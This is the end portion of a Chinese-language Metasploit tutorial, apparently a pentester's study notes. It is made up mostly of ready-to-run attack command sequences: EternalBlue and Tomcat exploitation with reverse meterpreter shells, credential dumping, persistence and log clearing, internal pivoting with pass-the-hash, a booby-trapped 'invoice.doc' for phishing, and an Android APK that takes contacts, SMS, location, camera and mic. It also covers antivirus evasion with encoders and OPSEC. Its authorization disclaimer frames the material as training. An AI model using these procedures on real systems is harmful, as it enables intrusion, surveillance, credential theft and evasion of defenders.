msf6 > use exploit/windows/smb/ms17_010_eternalblue
msf6 exploit(...) > set RHOSTS 192.168.1.100
msf6 exploit(...) > set PAYLOAD windows/x64/meterpreter/reverse_tcp
msf6 exploit(...) > set LHOST 192.168.1.50
msf6 exploit(...) > exploit

# 5. 获得 Meterpreter 会话
meterpreter > sysinfo
meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM

# 6. 后渗透
meterpreter > hashdump
meterpreter > load kiwi
meterpreter > creds_all

# 7. 持久化
meterpreter > run persistence -U -i 10 -p 4444 -r 192.168.1.50

# 8. 清理痕迹
meterpreter > clearev
```

### 18.2 案例二：Web 应用渗透

```bash
# 场景：渗透测试运行 Tomcat 的 Web 服务器

# 1. 扫描 Web 服务
msf6 > db_nmap -sV -p 8080 192.168.1.100

# 2. 扫描 Tomcat 管理器
msf6 > use auxiliary/scanner/http/tomcat_mgr_login
msf6 auxiliary(...) > set RHOSTS 192.168.1.100
msf6 auxiliary(...) > set RPORT 8080
msf6 auxiliary(...) > set STOP_ON_SUCCESS true
msf6 auxiliary(...) > run
[+] 192.168.1.100:8080 - Login Successful: tomcat:tomcat

# 3. 利用管理器上传 WAR
msf6 > use exploit/multi/http/tomcat_mgr_upload
msf6 exploit(...) > set RHOSTS 192.168.1.100
msf6 exploit(...) > set RPORT 8080
msf6 exploit(...) > set HttpUsername tomcat
msf6 exploit(...) > set HttpPassword tomcat
msf6 exploit(...) > set PAYLOAD java/meterpreter/reverse_tcp
msf6 exploit(...) > set LHOST 192.168.1.50
msf6 exploit(...) > exploit

# 4. 获得会话
meterpreter > sysinfo
meterpreter > getuid

# 5. 如果是 Linux，尝试提权
meterpreter > shell
$ uname -a
$ sudo -l
$ cat /etc/passwd
```

### 18.3 案例三：内网渗透

```bash
# 场景：已获得边界主机权限，需要渗透内网

# 1. 在已控制的主机上收集信息
meterpreter > ipconfig
# 发现内网网段 192.168.2.0/24

# 2. 添加路由
meterpreter > run autoroute -s 192.168.2.0/24
meterpreter > run autoroute -p

# 3. 扫描内网
meterpreter > background
msf6 > use auxiliary/scanner/portscan/tcp
msf6 auxiliary(...) > set RHOSTS 192.168.2.0/24
msf6 auxiliary(...) > set PORTS 22,80,445,3389
msf6 auxiliary(...) > set THREADS 50
msf6 auxiliary(...) > run

# 4. 发现内网 Windows 主机
msf6 > use auxiliary/scanner/smb/smb_ms17_010
msf6 auxiliary(...) > set RHOSTS 192.168.2.100
msf6 auxiliary(...) > run

# 5. 设置 SOCKS 代理
msf6 > use auxiliary/server/socks_proxy
msf6 auxiliary(...) > set SRVPORT 1080
msf6 auxiliary(...) > run -j

# 6. 通过代理攻击内网主机
msf6 > use exploit/windows/smb/ms17_010_eternalblue
msf6 exploit(...) > set RHOSTS 192.168.2.100
msf6 exploit(...) > set PAYLOAD windows/x64/meterpreter/bind_tcp
msf6 exploit(...) > exploit

# 7. 或使用 Pass-the-Hash
msf6 > use exploit/windows/smb/psexec
msf6 exploit(...) > set RHOSTS 192.168.2.100
msf6 exploit(...) > set SMBUser Administrator
msf6 exploit(...) > set SMBPass <hash>
msf6 exploit(...) > exploit
```

### 18.4 案例四：客户端攻击

```bash
# 场景：通过钓鱼邮件进行客户端攻击

# 1. 生成恶意文档
msf6 > use exploit/windows/fileformat/office_word_hta
msf6 exploit(...) > set PAYLOAD windows/meterpreter/reverse_tcp
msf6 exploit(...) > set LHOST 192.168.1.50
msf6 exploit(...) > set LPORT 4444
msf6 exploit(...) > set FILENAME invoice.doc
msf6 exploit(...) > exploit
[*] invoice.doc stored at /root/.msf4/local/invoice.doc

# 2. 设置监听器
msf6 > use exploit/multi/handler
msf6 exploit(...) > set PAYLOAD windows/meterpreter/reverse_tcp
msf6 exploit(...) > set LHOST 192.168.1.50
msf6 exploit(...) > set LPORT 4444
msf6 exploit(...) > exploit -j

# 3. 发送钓鱼邮件（使用外部工具如 GoPhish）
# 将 invoice.doc 作为附件发送

# 4. 等待目标打开文档
# 当目标打开文档时，会收到 Meterpreter 会话

# 5. 后渗透
meterpreter > sysinfo
meterpreter > screenshot
meterpreter > keyscan_start
```

### 18.5 案例五：Android 渗透

```bash
# 场景：渗透测试 Android 设备

# 1. 生成 Android Payload
msfvenom -p android/meterpreter/reverse_tcp LHOST=192.168.1.50 LPORT=4444 \
    -o evil.apk

# 2. 设置监听器
msf6 > use exploit/multi/handler
msf6 exploit(...) > set PAYLOAD android/meterpreter/reverse_tcp
msf6 exploit(...) > set LHOST 192.168.1.50
msf6 exploit(...) > set LPORT 4444
msf6 exploit(...) > exploit

# 3. 诱导目标安装 APK

# 4. 获得会话后的操作
meterpreter > sysinfo
meterpreter > dump_contacts          # 导出联系人
meterpreter > dump_sms               # 导出短信
meterpreter > dump_calllog           # 导出通话记录
meterpreter > geolocate              # 获取位置
meterpreter > webcam_snap            # 拍照
meterpreter > record_mic -d 30       # 录音 30 秒
meterpreter > send_sms -d 10086 -t "test"  # 发送短信
```

---

## 19. 常见错误与解决方案

### 19.1 数据库连接问题

```bash
# 错误：Database not connected
msf6 > db_status
[*] postgresql selected, no connection

# 解决方案 1：启动 PostgreSQL
sudo systemctl start postgresql
sudo msfdb init

# 解决方案 2：重新初始化数据库
sudo msfdb reinit

# 解决方案 3：手动连接
msf6 > db_connect msf:password@127.0.0.1/msf

# 解决方案 4：检查 PostgreSQL 状态
sudo systemctl status postgresql
sudo -u postgres psql -c "SELECT version();"
```

### 19.2 模块加载失败

```bash
# 错误：Failed to load module
# 原因：模块语法错误或依赖缺失

# 解决方案 1：更新 Metasploit
sudo apt update && sudo apt install metasploit-framework

# 解决方案 2：重新加载模块
msf6 > reload_all

# 解决方案 3：检查模块语法
msf6 > loadpath /path/to/modules

# 解决方案 4：查看错误日志
cat ~/.msf4/logs/framework.log
```

### 19.3 Payload 执行失败

```bash
# 错误：Exploit completed, but no session was created

# 可能原因及解决方案：

# 1. 防火墙阻止连接
# 解决：使用 reverse_http 或 reverse_https
set PAYLOAD windows/meterpreter/reverse_https

# 2. 杀毒软件拦截
# 解决：使用编码器或免杀技术
set PAYLOAD windows/meterpreter/reverse_tcp
set EnableStageEncoding true
set StageEncoder x86/shikata_ga_nai

# 3. 架构不匹配
# 解决：确认目标架构
# 32位系统用 windows/meterpreter/reverse_tcp
# 64位系统用 windows/x64/meterpreter/reverse_tcp

# 4. 端口被占用
# 解决：更换端口
set LPORT 5555

# 5. 网络不通
# 解决：检查网络连接
# 确保 LHOST 是目标可达的 IP
```

### 19.4 会话断开问题

```bash
# 错误：Meterpreter session X closed. Reason: Died

# 解决方案 1：迁移到稳定进程
meterpreter > ps
meterpreter > migrate <stable_pid>

# 解决方案 2：使用持久化
meterpreter > run persistence -U -i 10 -p 4444 -r 192.168.1.50

# 解决方案 3：设置自动迁移
set AutoRunScript post/windows/manage/migrate

# 解决方案 4：使用更稳定的 Payload
set PAYLOAD windows/meterpreter/reverse_https
set SessionCommunicationTimeout 0
set SessionExpirationTimeout 0
```

### 19.5 权限不足

```bash
# 错误：Operation failed: Access is denied

# 解决方案 1：提权
meterpreter > getsystem

# 解决方案 2：使用提权模块
meterpreter > background
msf6 > use exploit/windows/local/bypassuac
msf6 exploit(...) > set SESSION 1
msf6 exploit(...) > exploit

# 解决方案 3：迁移到高权限进程
meterpreter > ps
meterpreter > migrate <high_priv_pid>

# 解决方案 4：使用 Token
meterpreter > load incognito
meterpreter > list_tokens -u
meterpreter > impersonate_token "NT AUTHORITY\\SYSTEM"
```

### 19.6 编码器问题

```bash
# 错误：No encoders encoded the buffer successfully

# 解决方案 1：减少坏字符
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.50 LPORT=4444 \
    -b '\x00' -f exe -o payload.exe

# 解决方案 2：使用不同编码器
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.50 LPORT=4444 \
    -e x86/alpha_mixed -f exe -o payload.exe

# 解决方案 3：增加 NOP 滑板
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.50 LPORT=4444 \
    -n 16 -f exe -o payload.exe
```

### 19.7 网络问题

```bash
# 错误：Connection refused / Connection timed out

# 检查清单：
# 1. 确认目标 IP 和端口正确
# 2. 确认目标服务正在运行
# 3. 确认没有防火墙阻止
# 4. 确认网络路由正确

# 解决方案 1：检查连接
msf6 > connect 192.168.1.100 445

# 解决方案 2：使用 Nmap 确认
msf6 > db_nmap -sT -p 445 192.168.1.100

# 解决方案 3：检查本地防火墙
sudo iptables -L
sudo ufw status

# 解决方案 4：使用代理
set Proxies socks5:127.0.0.1:1080
```

### 19.8 常见错误速查表

| 错误信息 | 可能原因 | 解决方案 |
|----------|----------|----------|
| `Database not connected` | PostgreSQL 未启动 | `sudo msfdb init` |
| `No session was created` | Payload 被拦截/架构不匹配 | 更换 Payload/使用免杀 |
| `Session X closed` | 进程被终止 | 迁移到稳定进程 |
| `Access is denied` | 权限不足 | 提权或使用 Token |
| `Connection refused` | 端口未开放/防火墙 | 检查目标服务和防火墙 |
| `Handler failed to bind` | 端口被占用 | 更换 LPORT |
| `Exploit failed` | 目标不存在漏洞 | 使用 check 命令验证 |
| `Bad characters` | Shellcode 包含坏字符 | 使用 -b 参数排除 |
| `Module not found` | 模块路径错误 | 使用 search 查找 |
| `Target not vulnerable` | 目标已修补 | 尝试其他漏洞 |

---

## 20. 最佳实践与安全建议

### 20.1 渗透测试流程

```
┌─────────────────────────────────────────────────────────────────┐
│                    渗透测试标准流程                              │
├─────────────────────────────────────────────────────────────────┤
│                                                                 │
│   1. 前期交互                                                   │
│      └── 获取授权、确定范围、签署协议                           │
│                                                                 │
│   2. 信息收集                                                   │
│      └── 被动收集、主动扫描、服务识别                           │
│                                                                 │
│   3. 威胁建模                                                   │
│      └── 分析攻击面、确定攻击路径                               │
│                                                                 │
│   4. 漏洞分析                                                   │
│      └── 漏洞扫描、漏洞验证、漏洞评估                           │
│                                                                 │
│   5. 漏洞利用                                                   │
│      └── 选择 Exploit、配置 Payload、执行攻击                   │
│                                                                 │
│   6. 后渗透                                                     │
│      └── 权限提升、横向移动、数据收集                           │
│                                                                 │
│   7. 报告                                                       │
│      └── 漏洞报告、风险评估、修复建议                           │
│                                                                 │
└─────────────────────────────────────────────────────────────────┘
```

### 20.2 操作安全（OPSEC）

```bash
# 1. 使用工作区隔离项目
msf6 > workspace -a client_project
msf6 > workspace client_project

# 2. 记录所有操作
msf6 > spool /path/to/project/msf.log

# 3. 使用加密通信
set PAYLOAD windows/meterpreter/reverse_https
set LPORT 443

# 4. 清理痕迹
meterpreter > clearev                    # 清除事件日志
meterpreter > timestomp file.txt -m "01/01/2020 00:00:00"

# 5. 使用代理链
set Proxies socks5:127.0.0.1:9050        # Tor 代理

# 6. 避免触发告警
set THREADS 5                            # 降低扫描速度
set ConnectTimeout 30                    # 增加超时时间
```

### 20.3 法律与道德

```
┌─────────────────────────────────────────────────────────────────┐
│                    渗透测试法律要求                              │
├─────────────────────────────────────────────────────────────────┤
│                                                                 │
│   ✓ 必须获得书面授权                                            │
│   ✓ 明确测试范围和边界                                          │
│   ✓ 签署保密协议（NDA）                                         │
│   ✓ 遵守当地法律法规                                            │
│   ✓ 保护客户数据安全                                            │
│   ✓ 及时报告发现的漏洞                                          │
│   ✓ 测试后清理所有后门                                          │
│                                                                 │
│   ✗ 禁止未授权测试                                              │
│   ✗ 禁止超出授权范围                                            │
│   ✗ 禁止泄露客户信息                                            │
│   ✗ 禁止造成不必要的损害                                        │
│   ✗ 禁止保留未授权的访问权限                                    │
│                                                                 │
└─────────────────────────────────────────────────────────────────┘
```

### 20.4 报告模板

```markdown
# 渗透测试报告

## 1. 执行摘要
- 测试时间：YYYY-MM-DD 至 YYYY-MM-DD
- 测试范围：192.168.1.0/24
- 发现漏洞：高危 X 个，中危 X 个，低危 X 个

## 2. 测试方法
- 使用工具：Metasploit Framework 6.x
- 测试类型：黑盒/白盒/灰盒

## 3. 发现的漏洞

### 3.1 高危漏洞
#### MS17-010 永恒之蓝
- 影响主机：192.168.1.100
- 风险等级：高危
- 漏洞描述：SMB 远程代码执行漏洞
- 利用方式：exploit/windows/smb/ms17_010_eternalblue
- 修复建议：安装 MS17-010 补丁

## 4. 修复建议
- 及时更新系统补丁
- 关闭不必要的服务
- 配置防火墙规则
- 部署入侵检测系统

## 5. 附录
- 详细扫描结果
- 漏洞利用截图
- 测试日志
```

### 20.5 常用命令速查

```bash
# ==================== 基础命令 ====================
msfconsole                    # 启动 MSF
search <keyword>              # 搜索模块
use <module>                  # 使用模块
info                          # 模块信息
show options                  # 显示选项
set <option> <value>          # 设置选项
exploit / run                 # 执行
back                          # 返回
exit                          # 退出

# ==================== 数据库命令 ====================
db_status                     # 数据库状态
workspace                     # 工作区
hosts                         # 主机列表
services                      # 服务列表
vulns                         # 漏洞列表
creds                         # 凭证列表
db_nmap                       # Nmap 扫描

# ==================== 会话命令 ====================
sessions -l                   # 列出会话
sessions -i <id>              # 进入会话
sessions -k <id>              # 终止会话
sessions -u <id>              # 升级会话

# ==================== Meterpreter 命令 ====================
sysinfo                       # 系统信息
getuid                        # 当前用户
getsystem                     # 提权
hashdump                      # 导出哈希
shell                         # 系统 shell
upload / download             # 上传/下载
screenshot                    # 截图
keyscan_start/dump/stop       # 键盘记录
migrate <pid>                 # 进程迁移
portfwd                       # 端口转发
run autoroute                 # 添加路由

# ==================== MSFvenom 命令 ====================
msfvenom -l payloads          # 列出 Payload
msfvenom -l encoders          # 列出编码器
msfvenom -l formats           # 列出格式
msfvenom -p <payload> -f <format> -o <file>  # 生成 Payload
```

---

## 总结

Metasploit Framework 是渗透测试领域最强大的工具之一。通过本笔记的学习，你应该掌握了：

1. **基础知识**：MSF 架构、模块类型、基本命令
2. **信息收集**：端口扫描、服务识别、漏洞扫描
3. **漏洞利用**：选择模块、配置 Payload、执行攻击
4. **Meterpreter**：基础命令、高级功能、扩展模块
5. **后渗透**：信息收集、凭证获取、权限提升
6. **横向移动**：Pass-the-Hash、内网代理、端口转发
7. **免杀技术**：编码器、MSFvenom、Evasion 模块
8. **自动化**：资源脚本、Ruby 脚本、Python 自动化
9. **实战案例**：Windows、Web、内网、客户端攻击
10. **最佳实践**：操作安全、法律道德、报告编写

记住：**渗透测试必须在获得授权的情况下进行**，未经授权的测试是违法行为。

---

> 最后更新：2024-01-15
> 免责声明：本笔记仅供学习和授权测试使用，请遵守当地法律法规
